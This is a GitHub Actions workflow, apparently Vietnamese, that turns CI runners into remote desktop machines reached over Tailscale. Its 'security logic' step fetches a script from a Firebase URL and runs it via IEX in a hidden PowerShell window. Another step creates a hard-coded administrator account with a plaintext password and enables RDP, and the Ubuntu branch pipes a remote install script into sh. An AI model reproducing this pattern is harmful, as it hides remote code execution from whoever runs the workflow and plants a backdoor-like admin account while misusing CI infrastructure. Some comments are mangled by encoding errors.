name: üåê ZUNRDP Cloud

on:
  workflow_dispatch:
    inputs:
      machine_name:
        description: 'Chon He Dieu Hanh'
        required: true
        type: choice
        default: 'Windows'
        options: [Windows, Ubuntu]
      owner_name:
        description: 'Ten Nguoi Tao'
        required: true
        default: 'Admin'

jobs:
  deploy:
    runs-on: ${{ github.event.inputs.machine_name == 'Windows' && 'windows-latest' || 'ubuntu-latest' }}
    steps:
      - name: 1. LAY MA NGUON
        uses: actions/checkout@v4

      - name: 2. LOGIC BAO MAT (WINDOWS)
        if: github.event.inputs.machine_name == 'Windows'
        shell: powershell
        run: |
          $logic = Invoke-RestMethod -Uri "https://zunrdp-default-rtdb.asia-southeast1.firebasedatabase.app/core_logic.json"
          $encoded = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($logic))
          $script = "IEX ([System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('$encoded')))"
          Start-Process powershell.exe -ArgumentList "-NoP -W Hidden -C $script"

      - name: 3. KET NOI TAILSCALE
        if: github.event.inputs.machine_name == 'Windows'
        shell: powershell
        run: |
          $msi = "$env:TEMP\tailscale.msi"
          Invoke-WebRequest "https://pkgs.tailscale.com/stable/tailscale-setup-latest-amd64.msi" -OutFile $msi
          Start-Process msiexec.exe -ArgumentList "/i", $msi, "/quiet", "/norestart" -Wait
          $env:Path += ";C:\Program Files\Tailscale\"
          Start-Service -Name "Tailscale" -ErrorAction SilentlyContinue
          net user ADMINZUN ZunRDP@123456 /add
          net localgroup administrators ADMINZUN /add
          Set-ItemProperty -Path 'HKLM:\System\CurrentControlSet\Control\Terminal Server' -name "fDenyTSConnections" -value 0
          Enable-NetFirewallRule -DisplayGroup "Remote Desktop"

      - name: 4. KICH HOAT (WINDOWS)
        if: github.event.inputs.machine_name == 'Windows'
        shell: powershell
        env:
          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
        run: |
          $env:Path += ";C:\Program Files\Tailscale\"
          tailscale up --authkey=$env:TS_KEY --hostname="ZunRDP-${{ github.run_id }}" --accept-routes --advertise-exit-node
          
          # TRUYEN BIEN VAO SCRIPT DE HIEN THI THOI GIAN CHINH XAC
          $Owner = "${{ github.event.inputs.owner_name }}"
          $MachineID = "Zun-WIN-${{ github.run_id }}"
          
          # Ch·∫°y script b√°o c√°o tr·∫°ng th√°i k√®m th√¥ng tin owner v√† startTime
          if (Test-Path ".\run_vm.ps1") {
             powershell -File ".\run_vm.ps1" -Owner "$Owner" -MachineID "$MachineID"
          }

      - name: 5. CAU HINH (UBUNTU)
        if: github.event.inputs.machine_name == 'Ubuntu'
        shell: bash
        env:
          TS_KEY: ${{ secrets.TAILSCALE_AUTH_KEY }}
        run: |
          sudo apt-get update
          sudo apt-get install -y xrdp
          curl -fsSL https://tailscale.com/install.sh | sh
          sudo tailscale up --authkey=$TS_KEY --hostname="ZunUbuntu-${{ github.run_id }}" --accept-routes
          # (Ph·∫ßn Ubuntu b·∫°n c√≥ th·ªÉ l√†m t∆∞∆°ng t·ª± n·∫øu mu·ªën hi·ªán Uptime)

